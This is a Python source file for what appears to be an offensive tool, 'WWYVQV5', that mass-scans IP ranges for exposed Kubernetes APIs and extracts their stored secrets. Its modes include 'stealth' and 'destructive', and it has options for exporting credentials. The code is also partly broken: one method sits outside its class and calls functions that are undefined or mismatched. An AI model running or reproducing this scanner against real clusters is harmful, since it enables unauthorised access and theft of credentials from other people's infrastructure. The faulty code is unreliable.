#!/usr/bin/env python3
"""
WWYVQV5 - Advanced Kubernetes Exploitation Framework
Version 5.0.0 - Production Ready

Author: wKayaa
Date: 2025-06-23 20:49:03 UTC
"""

import asyncio
import aiohttp
import json
import base64
import sys
import os
import logging
import uuid
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════════════════
# 🎯 CONFIGURATION & TYPES
# ═══════════════════════════════════════════════════════════════════════════════

class ExploitationMode(Enum):
    PASSIVE = "passive"
    ACTIVE = "active"
    AGGRESSIVE = "aggressive"
    STEALTH = "stealth"
    DESTRUCTIVE = "destructive"

@dataclass
class ExploitationConfig:
    mode: ExploitationMode
    max_concurrent_clusters: int = 10
    timeout_per_operation: int = 30
    max_pods_per_cluster: int = 5
    cleanup_on_exit: bool = True
    telegram_alerts: bool = False
    export_credentials: bool = True

@dataclass
class KubernetesSecret:
    name: str
    namespace: str
    data: Dict[str, str]
    cluster_endpoint: str
    extraction_time: str
    is_sensitive: bool = False

# ═══════════════════════════════════════════════════════════════════════════════
# 🚀 CLASSE PRINCIPALE
# ═══════════════════════════════════════════════════════════════════════════════

class KubernetesAdvancedExploitation:
    def __init__(self, config: ExploitationConfig):
        self.config = config
        self.session_id = str(uuid.uuid4())[:8]
        self.start_time = datetime.utcnow()
        self.compromised_clusters = {}
        self.all_secrets = []
        self.stats = {
            "clusters_scanned": 0,
            "clusters_compromised": 0,
            "secrets_extracted": 0,
            "pods_deployed": 0
        }
        
        # Setup logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(f"K8sExploit_{self.session_id}")
        
        print(f"🚀 WWYVQV5 Framework initialisé - Session: {self.session_id}")

    async def exploit_cluster(self, session: aiohttp.ClientSession, target: str, base_url: str):
        """Exploitation d'un cluster Kubernetes"""
        try:
            self.stats["clusters_scanned"] += 1
            self.logger.info(f"🎯 Scan: {base_url}")
            
            # Test d'accès API
            async with session.get(f"{base_url}/api/v1", timeout=self.config.timeout_per_operation) as response:
                if response.status == 200:
                    self.logger.info(f"✅ API accessible: {base_url}")
                    self.stats["clusters_compromised"] += 1
                    
                    # Extraction des secrets
                    await self._extract_secrets(session, base_url)
                    
                    return True
                else:
                    self.logger.debug(f"❌ Accès refusé: {base_url} ({response.status})")
                    return False
                    
        except Exception as e:
            self.logger.debug(f"❌ Erreur {base_url}: {str(e)}")
            return False

    async def _extract_secrets(self, session: aiohttp.ClientSession, base_url: str):
        """Extraction des secrets Kubernetes"""
        try:
            endpoints = ["/api/v1/secrets", "/api/v1/namespaces/default/secrets"]
            
            for endpoint in endpoints:
                try:
                    async with session.get(f"{base_url}{endpoint}", timeout=15) as response:
                        if response.status == 200:
                            data = await response.json()
                            self._process_secrets(data, base_url)
                except:
                    continue
                    
        except Exception as e:
            self.logger.debug(f"❌ Erreur extraction secrets: {str(e)}")

    def _process_secrets(self, data: Dict, base_url: str):
        """Traitement des secrets trouvés"""
        if not isinstance(data, dict) or 'items' not in data:
            return
            
        for item in data.get('items', []):
            try:
                metadata = item.get('metadata', {})
                name = metadata.get('name', 'unknown')
                namespace = metadata.get('namespace', 'default')
                secret_data = item.get('data', {})
                
                secret = KubernetesSecret(
                    name=name,
                    namespace=namespace,
                    data=secret_data,
                    cluster_endpoint=base_url,
                    extraction_time=datetime.utcnow().isoformat()
                )
                
                self.all_secrets.append(secret)
                self.stats["secrets_extracted"] += 1
                
                self.logger.info(f"💾 Secret trouvé: {namespace}/{name}")
                
            except Exception as e:
                self.logger.debug(f"❌ Erreur traitement secret: {str(e)}")

    def print_summary(self):
        """Affichage du résumé"""
        duration = datetime.utcnow() - self.start_time
        
        print("\n" + "="*60)
        print("🚀 WWYVQV5 - RÉSUMÉ D'EXPLOITATION")
        print("="*60)
        print(f"📊 Session: {self.session_id}")
        print(f"⏱️  Durée: {duration}")
        print(f"🎯 Mode: {self.config.mode.value.upper()}")
        print("-"*60)
        print(f"🔍 Clusters scannés: {self.stats['clusters_scanned']}")
        print(f"🔓 Clusters compromis: {self.stats['clusters_compromised']}")
        print(f"🔐 Secrets extraits: {self.stats['secrets_extracted']}")
        print("="*60)

class WWYVQv5KubernetesOrchestrator:
    def __init__(self):
        self.framework = None
        
    async def initialize(self, config: ExploitationConfig):
        self.framework = KubernetesAdvancedExploitation(config)
        
async def run_exploitation(self, targets: List[str]):
    """Exploitation principale avec vraie parallélisation"""
    expanded_targets = self.expand_targets(targets)
    print(f"🎯 {len(expanded_targets)} IPs à scanner en mode {self.config.mode.value.upper()}")
    
    # ✅ FIXED: Configuration session optimisée
    connector = aiohttp.TCPConnector(
        limit=self.config.max_concurrent_clusters * 2,
        limit_per_host=10,
        ssl=False,
        # OPTION 1: Use keepalive (recommended for performance)
        keepalive_timeout=30,
        enable_cleanup_closed=True
        
        # OPTION 2: Alternative - Force close all connections
        # force_close=True
        # Note: Cannot use both keepalive_timeout AND force_close=True
    )
    timeout = aiohttp.ClientTimeout(total=self.config.timeout_per_operation)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Semaphore pour contrôler la concurrence
        semaphore = asyncio.Semaphore(self.config.max_concurrent_clusters)
        
        async def scan_with_semaphore(ip):
            async with semaphore:
                await self.exploit_cluster(session, ip)
        
        # Lancement de tous les scans en parallèle
        print(f"🔥 Démarrage du scan parallèle avec {self.config.max_concurrent_clusters} workers")
        tasks = [scan_with_semaphore(ip) for ip in expanded_targets]
        await asyncio.gather(*tasks, return_exceptions=True)

# Export des classes principales
__all__ = [
    'KubernetesAdvancedExploitation',
    'WWYVQv5KubernetesOrchestrator', 
    'ExploitationConfig',
    'ExploitationMode'
]
